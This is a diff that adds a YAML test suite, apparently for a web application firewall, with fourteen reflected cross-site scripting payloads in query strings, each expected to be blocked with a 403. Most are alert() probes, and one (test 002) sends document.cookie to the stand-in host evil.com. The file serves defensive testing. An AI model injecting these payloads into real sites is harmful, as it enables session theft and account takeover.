@@ -1,0 +1,160 @@
+meta:
+  category: "Cross-Site Scripting"
+  subcategory: "Reflected XSS"
+  owasp: "A03:2021, WSTG-CLNT-01"
+  severity: "high"
+
+tests:
+  - id: "xss-reflected-001"
+    title: "Basic script tag"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<script>alert('XSS')</script>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-002"
+    title: "Script tag with document.cookie"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<script>document.location='http://evil.com/?c='+document.cookie</script>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-003"
+    title: "IMG onerror event handler"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<img src=x onerror=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-004"
+    title: "SVG onload event handler"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<svg onload=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-005"
+    title: "Body onload event handler"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<body onload=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-006"
+    title: "JavaScript protocol in anchor"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/redirect"
+      query_string: "url=javascript:alert('XSS')"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-007"
+    title: "Input autofocus onfocus"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=\"><input autofocus onfocus=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-008"
+    title: "Marquee onstart event"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<marquee onstart=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-009"
+    title: "Details ontoggle event"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<details open ontoggle=alert('XSS')>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-010"
+    title: "Video onerror"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<video><source onerror=alert('XSS')></video>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-011"
+    title: "IFrame src javascript"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<iframe src=\"javascript:alert('XSS')\"></iframe>"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-012"
+    title: "Object data javascript"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<object data=\"javascript:alert('XSS')\">"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-013"
+    title: "Embed src javascript"
+    tags: ["xss", "reflected", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<embed src=\"javascript:alert('XSS')\">"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "xss-reflected-014"
+    title: "Math tag with xlink"
+    tags: ["xss", "reflected", "paranoia-2"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\"M0,0\"><animate attributeName=d values=alert(1) />"
+    expected:
+      status: 403
+      action: "block"
